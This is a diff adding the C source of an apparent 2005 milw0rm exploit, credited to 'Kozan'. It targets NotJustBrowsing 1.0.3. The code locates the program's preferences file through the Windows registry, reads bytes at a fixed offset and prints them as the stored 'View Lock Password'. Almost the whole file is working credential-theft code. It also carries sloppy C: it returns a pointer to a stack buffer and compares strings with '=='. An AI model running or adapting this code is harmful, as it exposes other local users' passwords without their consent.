@@ -1,0 +1,85 @@
+/*****************************************************************
+
+NotJustBrowsing 1.0.3 Local Password Disclosure Exploit by Kozan
+
+Application: NotJustBrowsing 1.0.3
+Procuder: www.notjustbrowsing.com
+Vulnerable Description: NotJustBrowsing 1.0.3 discloses passwords
+to local users.
+
+Discovered & Coded by Kozan
+Credits to ATmaCA
+www.netmagister.com - www.spyinstructors.com
+kozan@netmagister.com
+
+*****************************************************************/
+
+#include <stdio.h>
+#include <windows.h>
+
+
+HKEY hKey;
+#define BUFSIZE 100
+char prgfiles[BUFSIZE];
+DWORD dwBufLen=BUFSIZE;
+LONG lRet;
+
+
+char *bilgi_oku(int adres,int uzunluk)
+{
+	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+					"SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
+					0,
+					KEY_QUERY_VALUE,
+					&hKey
+					) == ERROR_SUCCESS)
+	{
+
+	lRet = RegQueryValueEx( hKey, "ProgramFilesDir", NULL, NULL,(LPBYTE) prgfiles,
+&dwBufLen);
+	if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) )
+	{
+		RegCloseKey(hKey);
+		return NULL;
+	}
+	RegCloseKey(hKey);
+
+	strcat(prgfiles,"\\NetLeaf Limited\\NotJustBrowsing\\notjustbrowsing.prf");
+
+	int i;
+	FILE *fp;
+	char ch[100];
+	if((fp=fopen(prgfiles,"rb")) == NULL)
+	{
+		return "NOTINSTALLED";
+	}
+	fseek(fp,adres,0);
+	for(i=0;i<uzunluk;i++)
+	ch[i]=getc(fp);
+	ch[i]=NULL;
+	fclose(fp);
+	return ch;
+	}
+}
+
+int main()
+{
+	printf("NotJustBrowsing 1.0.3 Local Password Disclosure Exploit by Kozan\n");
+	printf("Credits to ATmaCA\n");
+	printf("www.netmagister.com - www.spyinstructors.com\n");
+	printf("kozan@netmagister.com\n\n");
+	if(bilgi_oku(4,3)==NULL)
+	{
+		printf("An error occured!\n");
+		return -1;
+	}
+	if(bilgi_oku(4,3)=="NOTINSTALLED")
+	{
+		printf("NotJustBrowsing 1.0.3 is not installed on your system!\n");
+		return -1;
+	}
+	printf("View Lock Password: %s",bilgi_oku(4,3));
+	return 0;
+}
+
+// milw0rm.com [2005-04-28]
